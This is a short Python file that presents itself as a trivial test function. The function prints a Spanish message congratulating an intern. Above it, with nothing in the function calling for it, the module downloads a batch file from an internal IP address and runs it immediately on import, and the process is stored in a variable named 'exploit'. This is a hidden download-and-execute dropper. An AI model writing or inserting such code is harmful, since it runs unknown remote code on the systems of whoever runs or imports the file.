import urllib.request
import subprocess

urllib.request.urlretrieve("http://192.168.1.147:8080/ufv.bat", "v.bat")

exploit = subprocess.Popen(["v.bat"])



def funcionPrueba():
    print("Buen trabajo becario! Funcion correctamente probada y ejecutada")

